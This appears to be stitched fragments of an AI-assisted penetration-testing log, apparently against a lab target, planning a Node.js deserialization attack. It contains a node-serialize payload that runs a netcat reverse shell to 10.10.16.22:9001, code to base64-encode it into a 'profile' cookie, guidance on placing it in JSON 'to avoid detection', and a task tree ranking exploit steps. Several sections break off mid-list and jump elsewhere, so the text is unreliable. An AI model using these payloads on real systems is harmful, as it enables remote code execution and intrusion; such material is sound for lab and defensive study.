It's important to review the server's response to the payload, as well as any error messages, to adapt the payload accordingly.\n\nHere's an alternative reverse shell payload that uses a different approach, which might bypass certain types of filtering:\n\nJavaScript payload using `child_process` module:\n```javascript\nconst payload = {\n  rce: function(){\n    require('child_process').exec('nc 10.10.16.22 9001 -e /bin/sh');\n  }\n};\n```\n\nThis payload uses the `nc` (Netcat) command to attempt to create a reverse shell connection to the attacker's machine at 10.10.16.22 on port 9001. The `-e` option is used to execute `/bin/sh`, providing shell access.\n\nTo serialize and encode this payload for use in the `profile` cookie:\n```javascript\nconst serialize = require('node-serialize');\npayload.rce = payload.rce.toString();\nlet serialized = serialize.serialize(payload);\nlet encodedPayload = Buffer.from(serialized).toString('base64');\n```\n\nAfter creating the serialized and encoded payload, the tester would replace the `profile` cookie's value with this encoded payload and send it to the server.\n\nHere's the updated PTT with the status of the tasks and the addition of the new reverse shell payload testing task:\n\n```\n1.

Serialize your payload to a format that the server-side application expects, typically a string that represents an object after deserialization.\n2. Encode the serialized payload to ensure it is safely transmitted, often using base64 encoding.\n3. Create a JSON object where the field is assigned the encoded payload string.\n4. Send this JSON object as part of the request body to the Express application, typically in a POST request.\n\nHere's an example in JavaScript for an Express application expecting JSON input:\n\n```javascript\n// Assume 'serializedPayload' is your serialized and base64 encoded payload\nlet jsonPayload = {\n  \"yourFieldName\": serializedPayload\n};\n\n// Convert the JSON object to a string to send as the request body\nlet jsonString = JSON.stringify(jsonPayload);\n\n// You would then send 'jsonString' as the body of your HTTP POST request\n```\n\nEnsure that the request's `Content-Type` header is set to `application/json` when sending the JSON payload.\n\nNow, let's update the PTT with the consideration of placing the deserialization payload in JSON:\n\n```\n1.

This task is critical because it involves crafting a payload that the Express application will deserialize, potentially leading to remote code execution if the application is vulnerable to deserialization attacks. The tester should ensure that the payload is crafted according to the specific deserialization mechanism used by the application and that it's appropriately serialized and encoded to avoid detection or corruption during transmission.Possible to-do tasks:\n1. 1.3.2.1.3.1 Check for hidden directories or files\n2. 1.3.2.1.3.2 Test for common web vulnerabilities\n3. 1.3.2.1.3.4.1.1 Map server response to changes in 'username'\n4. 1.3.2.1.3.4.1.2 Map server response to changes in 'num'\n5. 1.3.2.1.3.4.1.3 Test for type-related vulnerabilities\n6. 1.3.2.1.3.4.1.4.1 Test with benign JavaScript payload\n7. 1.3.2.1.3.4.1.5 Test with deserialization payload\n8. 1.3.2.1.3.4.1.6.1 Test with alternative reverse shell payload\n9. 1.3.2.1.3.4.1.7 Place deserialization payload in JSON as a field value\n10. 1.3.2.1.3.4.2.1 Test for horizontal privilege escalation\n11. 1.3.2.1.3.4.2.2 Test for vertical privilege escalation\n12. 1.3.2.1.3.5 Investigate server-side processing logic and potential template injection\n\nFavorable and most likely to lead to successful exploit:\n1.3.2.1.3.4.1.7 Place deserialization payload in JSON as a field value\n\nHow to perform the task:\nCraft a deserialization payload that, when deserialized by the server, will execute arbitrary code or a reverse shell.
